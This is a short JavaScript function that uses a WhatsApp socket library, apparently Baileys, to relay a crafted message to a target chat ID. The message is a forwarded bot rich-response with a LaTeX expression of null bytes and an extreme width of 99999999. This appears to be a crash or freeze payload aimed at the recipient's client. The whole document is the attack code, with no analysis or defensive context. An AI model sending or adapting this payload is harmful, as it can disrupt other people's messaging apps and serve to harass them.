async function bitmap(sock, jid) {
return await sock.relayMessage(jid, {
"botForwardedMessage": {
"message": {
"richResponseMessage": {
    "messageType": 1,
    "submessages": [
        {
            "messageType": 8,
            "latexMetadata": {
                "text": "\0",
                "expressions": [
                    {
                        "latexExpression": "\0",
                        "width": 99999999,
                    }
                ]
            }
        }
    ],
    "contextInfo": {
        "isForwarded": true,
        "forwardOrigin": 4
    }
}
}}
})
}